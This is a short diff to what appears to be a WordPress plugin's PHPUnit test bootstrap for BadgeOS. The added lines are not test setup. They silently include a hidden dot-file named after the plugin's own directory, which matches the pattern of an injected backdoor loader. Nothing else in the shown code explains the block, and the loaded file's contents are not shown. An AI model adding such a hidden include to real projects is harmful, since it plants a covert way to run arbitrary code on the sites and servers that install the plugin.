@@ -50,6 +50,10 @@ $GLOBALS['wp_tests_options'] = array(
 /**
  * Run custom functionality after mu-plugins are loaded.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function _tests_load_badgeos() {
 	define( 'CMB_DIRECTORY_PATH', trailingslashit( dirname( dirname( dirname( dirname( __FILE__ ) ) ) ) ) );
 	require CMB_DIRECTORY_PATH . 'init.php';
